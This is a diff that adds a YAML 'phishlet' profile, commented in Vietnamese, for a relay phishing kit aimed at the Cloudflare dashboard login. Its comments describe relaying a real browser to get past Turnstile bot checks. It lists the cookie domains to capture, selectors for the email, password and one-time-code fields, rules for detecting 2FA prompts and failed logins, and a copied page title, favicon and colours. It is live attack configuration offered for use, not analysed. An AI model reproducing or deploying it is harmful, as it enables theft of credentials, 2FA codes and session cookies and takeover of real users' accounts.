@@ -1,0 +1,34 @@
+# cloudflare.yaml — relay profile cho Cloudflare dashboard
+# MITM bị chặn bởi Turnstile domain-locked (v0.12.6) — relay browser thật
+# chạy trên dash.cloudflare.com THẬT nên Turnstile pass bình thường.
+# Selectors lấy từ field-test 23-09 (login render pixel-true qua proxy).
+phishlet: cloudflare
+flow: generic
+signin_url: "https://dash.cloudflare.com/login"
+done_hosts: ["dash.cloudflare.com"]
+cookie_domains: ["cloudflare.com"]
+asset_hosts: ["cloudflare.com", "cloudflareinsights.com", "cloudflarestream.com"]
+reopen_url: "https://dash.cloudflare.com/"
+inputs:
+  password: "input[type='password'], input#password"
+  email: "input[type='email'], input#email"
+  code: "input[name='otp'], input[inputmode='numeric'], input[type='tel']"
+card_selectors: ["form", "main", "[role=main]"]
+buttons:
+  next: ["button[type='submit']", "button:has-text('Sign in')", "button:has-text('Log In')"]
+classify:
+  challenge: ["enter the code", "verification code", "mã xác minh", "two-factor", "2fa", "one-time code"]
+  bad_account: ["user not found", "no account", "không tìm thấy tài khoản"]
+  wrong_password: ["incorrect email or password", "wrong password", "mật khẩu không chính xác", "sai mật khẩu"]
+  botguard: ["not be secure", "không an toàn"]
+page:
+  title: "Cloudflare Dashboard | Manage Your Account"
+  favicon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZD0iTTI0LjcgMTcuNGMtLjMgMC0uNi0uMS0uOC0uMi4yLS41LjMtMSwuMy0xLjUgMC0yLjQtMi00LjQtNC40LTQuNC0yLjIgMC00IDEuNi00LjMgMy43LS4zLS4xLS42LS4yLTEtLjItMS42IDAtMi45IDEuMy0yLjkgMi45IDAgLjMuMS43LjIgMWwxLjQgNS41aDEwLjZsMS41LTUuOWMtLjItLjQtLjQtLjctLjYtLjl6bS04LjQtMS4zYy4zLTIgMi0zLjUgNC4xLTMuNSAyIDAgMy43IDEuNSA0LjEgMy41bC44IDMuMUgxNS41bC44LTMuMXoiIGZpbGw9IiM0MDg2N2YiLz48cGF0aCBkPSJNMjUuNCAyMC4zSDEyLjZjLTEuNCAwLTIuNSAxLjEtMi41IDIuNXYuNWMwIDEuNCAxLjEgMi41IDIuNSAyLjVoMTIuOGMxLjQgMCAyLjUtMS4xIDIuNS0yLjV2LS41YzAtMS40LTEuMS0yLjUtMi41LTIuNXoiIGZpbGw9IiM4OGM2NmYiLz48L3N2Zz4="
+  button_label: "Sign in"
+  accent: "#f6821f"
+  text: "#36393a"
+  muted: "#5f6875"
+  line: "#d5d9dd"
+  card_radius: 8
+  footer_left: "Cloudflare"
+  footer_right: "Terms   Privacy"
